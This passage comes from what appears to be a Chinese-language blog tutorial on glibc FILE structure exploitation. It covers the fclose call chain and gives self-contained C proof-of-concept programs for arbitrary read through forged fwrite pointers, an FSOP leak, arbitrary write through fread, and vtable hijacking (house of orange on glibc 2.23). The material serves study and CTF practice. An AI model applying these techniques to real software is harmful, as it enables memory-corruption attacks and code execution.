&#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *f</span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  _flags = <span class="number">2048</span>,</span><br><span class="line">  _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">  _IO_read_end = <span class="number">0x404038</span> &lt;flag&gt; <span class="string">&quot;flag&#123;secret&#125;&quot;</span>,</span><br><span class="line">  _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_base = <span class="number">0x404038</span> &lt;flag&gt; <span class="string">&quot;flag&#123;secret&#125;&quot;</span>,</span><br><span class="line">  _IO_write_ptr = <span class="number">0x405038</span> &lt;error: Cannot access memory at address <span class="number">0x405038</span>&gt;,</span><br><span class="line">  _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">  _markers = <span class="number">0x0</span>,</span><br><span class="line">  _chain = <span class="number">0x0</span>,</span><br><span class="line">  _fileno = <span class="number">1</span>,</span><br><span class="line">  _flags2 = <span class="number">0</span>,</span><br><span class="line">  _old_offset = <span class="number">0</span>,</span><br><span class="line">  _cur_column = <span class="number">0</span>,</span><br><span class="line">  _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">  _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">  _lock = <span class="number">0x1458790</span>,</span><br><span class="line">  _offset = <span class="number">-1</span>,</span><br><span class="line">  _codecvt = <span class="number">0x0</span>,</span><br><span class="line">  _wide_data = <span class="number">0x14587a0</span>,</span><br><span class="line">  _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">  _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">  __pad5 = <span class="number">0</span>,</span><br><span class="line">  _mode = <span class="number">-1</span>,</span><br><span class="line">  _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="fclose">fclose</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flose(_IO_new_fclose@glibc-2.23/libio/iofclose.c:38)</span><br><span class="line">	-&gt;_IO_un_link@glibc-2.23/libio/genops.c:58</span><br><span class="line">		//从_IO_list_all为首的单向链表上遍历找到并拆下这个_IO_FILE_plus,</span><br><span class="line">	-&gt;_IO_file_close_it@glibc-2.23/libio/fileops.c:157</span><br><span class="line">		-&gt;_IO_do_flush			//缓冲区还有东西没打印出来,都给打出来</span><br><span class="line">			-&gt;_IO_do_write</span><br><span class="line">				-&gt;new_do_write</span><br><span class="line">					-&gt;vtable.__write</span><br><span class="line">						-&gt;write(linux api)</span><br><span class="line">						</span><br><span class="line">		-&gt;_IO_un_link	//这一次重复调用好像是多余的,可能防止之前有什么差错?</span><br><span class="line">	-&gt;vtable.__finish(_IO_new_file_finish)</span><br><span class="line">		-&gt;_IO_do_flush	//第二次调用</span><br><span class="line">			...</span><br><span class="line">		-&gt;__close</span><br><span class="line">			-&gt;_IO_file_close_it	//第二次调用</span><br><span class="line">		-&gt;_IO_default_finish</span><br><span class="line">			-&gt;free	//释放对上占用的内存</span><br><span class="line">			-&gt;_IO_un_link	//第三次调用</span><br></pre></td></tr></table></figure>
<h2 id="exploit">exploit</h2>
<h3 id="泄露">泄露</h3>
<p>篡改fp的写缓冲区指针指向需要泄露的地址,
并篡改fp的文件描述符为标准输出, 触发一个缓冲区刷新, 即可打印泄露</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span></span><br></pre></td></tr></table></figure>
<p>把 <strong>ptr</strong> 所指向的数组中的数据写入到给定流
<strong>stream</strong> 中。</p>
<p>写入<code>size</code>大小的单位<code>nmemb</code>个</p>
</blockquote>
<p>写一个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> secret[]=<span class="string">&quot;this is a secret&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,secret);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);		<span class="comment">// unset _IO_NO_WRITES to bypass checks in _IO_file_overflow</span></span><br><span class="line">    fp-&gt;_flags = <span class="number">0x800</span>; 			<span class="comment">//IO_CURRENTLY_PUTTING bypass checks in _IO_file_overflow</span></span><br><span class="line">    fp-&gt;_IO_write_base = secret;	<span class="comment">//points to address that we want to leak</span></span><br><span class="line">    fp-&gt;_IO_read_end = secret;      <span class="comment">//IO_read_end must equals to write_base to bypass checks in new_do_write</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = secret + <span class="keyword">sizeof</span>(secret);	<span class="comment">//ptr - base contains our flag to leak</span></span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;               	<span class="comment">//redirect to stdout</span></span><br><span class="line"></span><br><span class="line">    fwrite(buffer,<span class="number">0x100</span>,<span class="number">0x1</span>,fp);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设我们能够控制<code>fp</code>指向的<code>FILE</code>结构,并能改写其成员</p>
<p>我们希望通过设置<code>fp-&gt;_IO_write_base = secret;</code>触发调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fwrite</span><br><span class="line">	_IO_sputn =&gt; _IO_file_xsputn</span><br><span class="line">		_IO_OVERFLOW =&gt; _IO_file_overflow</span><br><span class="line">			=&gt; _IO_new_do_write</span><br><span class="line">				=&gt; new_do_write</span><br><span class="line">					=&gt; _IO_file_write</span><br><span class="line">						=&gt; __write</span><br></pre></td></tr></table></figure>
<p>从而打印<code>secret</code>上的字符串</p>
<p>为了实现这一目的,还需要设置<code>FILE</code>的几个参数</p>
<h4 id="fp-fopen.flag-w">-1.<code>fp = fopen("./flag", "w");</code></h4>
<p>这个<code>fp</code>要么以<code>w</code>打开,要么手动设置其<code>flag |= ~0x8</code></p>
<p>总之不能有<code>_IO_NO_WRITES</code>,
这是因为<code>_IO_file_overflow</code>最开始会检查该标志,
防止对不可写的文件进行写入操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<h4
id="fp-_io_write_base-secret">0.<code>fp-&gt;_IO_write_base = secret;</code></h4>
<p>最关键的一条,要泄露的地址</p>
<h4
id="fp-_io_write_ptr-secret-sizeofsecret">1.<code>fp-&gt;_IO_write_ptr = secret + sizeof(secret);</code></h4>
<p>与0紧密配合,<code>_IO_OVERFLOW</code>会将位于<code>write_base</code>和<code>write_ptr</code>之间的内容刷新到缓冲区</p>
<p>要保证两者之间的距离大于flag长度</p>
<h4 id="fp-_flags-0x800">3.<code>fp-&gt;_flags = 0x800;</code></h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = 0x800; //IO_CURRENTLY_PUTTING</span><br></pre></td></tr></table></figure>
<p>这里是因为在函数<code>_IO_file_overflow</code>中,如果不设置该标志会进入一个条件分支,修改我们预设的<code>_IO_write_base</code>等一系列指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_IO_new_file_overflow</span></span><br><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">   If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">   logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">   read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">   makes room for subsequent output.</span></span><br><span class="line"><span class="comment">   Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">   alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(_IO_in_backup(f)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">        _IO_free_backup_area(f);</span><br><span class="line">        f-&gt;_IO_read_base -= MIN(nbackup,</span><br><span class="line">                                f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">        f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4
id="fp-_io_read_end-secret">4.<code>fp-&gt;_IO_read_end = secret;</code></h4>
<p>这条是为了绕过<code>new_do_write</code>中的检查,</p>
<p>要么<code>_flags</code>中有<code>_IO_IS_APPENDING(0x1000)</code>标志,</p>
<p>要么<code>fp-&gt;_IO_read_end == fp-&gt;_IO_write_base</code></p>
<p>才能避免<code>_IO_SYSSEEK</code>的调用,因为<code>_IO_SYSSEEK</code>调用后<code>new_pos == _IO_pos_BA</code>,接下来就返回了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//new_do_write</span></span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">off64_t</span> new_pos = _IO_SYSSEEK(fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_offset = new_pos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此将<code>flags</code>置位<code>_IO_IS_APPENDING</code>也可以</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0x800</span> | <span class="number">0x1000</span>;</span><br></pre></td></tr></table></figure>
<h4 id="fsop方法">FSOP方法</h4>
<p>如果没有fwrite调用,也可以考虑利用FSOP方法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> secret[]=<span class="string">&quot;flag&#123;dustball&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,secret);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags = <span class="number">0x800</span> | <span class="number">0x1000</span>; <span class="comment">//IO_CURRENTLY_PUTTING</span></span><br><span class="line">    fp-&gt;_IO_write_base = secret;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end = secret;      //IO_read_end must equals to write_base to overpass check in</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = secret + <span class="keyword">sizeof</span>(secret);</span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;                  <span class="comment">//stdout</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//no fwrite , however fp is linked to _IO_list_all, use FSOP</span></span><br><span class="line">    <span class="comment">// fwrite(buffer,0x100,0x1,fp);     </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="任意地址写">任意地址写</h3>
<p>写个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> key = <span class="number">0x12345678</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">  fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="comment">//fp -&gt; _flags不能有IO_NO_READS,也不能有_IO_EOF_SEEN</span></span><br><span class="line">  fp -&gt; _IO_read_ptr = <span class="number">0</span>;</span><br><span class="line">  fp -&gt; _IO_read_end = <span class="number">0</span>;</span><br><span class="line">  fp -&gt; _IO_buf_base = &amp;key;</span><br><span class="line">  fp -&gt; _IO_buf_end = &amp;key + <span class="number">4</span>;</span><br><span class="line">  fp -&gt; _fileno = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  fread(buffer,<span class="number">1</span>,<span class="number">4</span>,fp);             <span class="comment">//方向fp -&gt; _IO_buf_base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,key);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设我们能够控制<code>fp</code>指向的<code>FILE</code>结构,并能改写其成员</p>
<p>我们希望通过设置<code>fp-&gt;_IO_buf_base = target_addr;</code>触发调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fread</span><br><span class="line">	_IO_sgetn =&gt; _IO_file_xsgetn</span><br><span class="line">		__underflow</span><br><span class="line">			_IO_UNDERFLOW =&gt; _IO_file_underflow</span><br><span class="line">				_IO_SYSREAD =&gt; _IO_file_read</span><br><span class="line">					__read</span><br></pre></td></tr></table></figure>
<p>从而实现往<code>target_addr</code>写入任意数据</p>
<p>为了实现这一目的，还需要设置fp的其他参数</p>
<h4 id="fp-fopen.flagr">-1.<code>fp = fopen("./flag","r");</code></h4>
<p><code>fp</code>必须是有读权限的，或者手动设置<code>flag</code>，不能有<code>IO_NO_READS(0x4)</code>标志</p>
<p>同时不能有<code>_IO_EOF_SEEN(0x10)</code></p>
<p>这是因为<code>_IO_file_underflow</code>会对flag进行检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4
id="fp---_io_buf_base-key">0.<code>fp -&gt; _IO_buf_base = &amp;key;</code></h4>
<p>任意地址写的关键</p>
<h4
id="fp---_io_buf_end-key-4">1.<code>fp -&gt; _IO_buf_end = &amp;key + 4;</code></h4>
<p>配合0,必须保证end和base之间的距离要大于fread写入的长度,</p>
<p>这是因为<code>_IO_file_xsgetn</code>中会检查这一点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">    fp-&gt;_IO_read_ptr += want;</span><br><span class="line">    want = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4
id="fp---_io_read_ptr-0-fp---_io_read_end-0">2.<code>fp -&gt; _IO_read_ptr = 0; &amp;&amp; fp -&gt; _IO_read_end = 0;</code></h4>
<p>这是因为在<code>_IO_file_underflow</code>中会检查两者是否相等</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure>
<h4 id="fp---_fileno-0">3.<code>fp -&gt; _fileno = 0;</code></h4>
<p>给予我们从标准输入获取任意字符到目标地址的权利</p>
<h3 id="house-of-orange-glibc-2.23">[house of orange @ glibc &lt;=
2.23]</h3>
<p>通过堆利用手段，控制堆上的<code>FILE</code>结构体，能够修改<code>vtable</code>指针，具体怎么堆利用，这不重要</p>
<p>重要的是把<code>vtable</code>指针修改为构造的假表中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line">  <span class="type">size_t</span> *fake_vtable;</span><br><span class="line">  <span class="type">size_t</span> *vtable_ptr;</span><br><span class="line">  <span class="type">size_t</span> *vtable_addr;</span><br><span class="line"></span><br><span class="line">  fake_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fake_vtable @ %p\n&quot;</span>, fake_vtable);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)&#123; <span class="comment">// 我今天就是要把这假表狠狠塞满</span></span><br><span class="line">    fake_vtable[i] = (<span class="type">size_t</span>)win;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fp @ %p\n&quot;</span>, fp);    </span><br><span class="line"></span><br><span class="line">  <span class="comment">//_IO_FILE_plus中vtable指针的偏移地址为0xd8</span></span><br><span class="line">  vtable_ptr  = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;vtable_ptr = %p\n&quot;</span>, vtable_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//曾经的vtable指针</span></span><br><span class="line">  vtable_addr = vtable_ptr[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;original vtable_addr = %p\n&quot;</span>, vtable_addr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//修改vtable指针指向假虚表</span></span><br><span class="line">  *vtable_ptr = fake_vtable;</span><br><span class="line">  vtable_addr = vtable_ptr[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;new vtable_addr = %p\n&quot;</span>, vtable_addr);</span><br><span class="line"></span><br><span class="line">  fclose(fp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>ubuntu16.04 &amp; glibc-2.23</code>上实验,成功劫持了虚表</p>
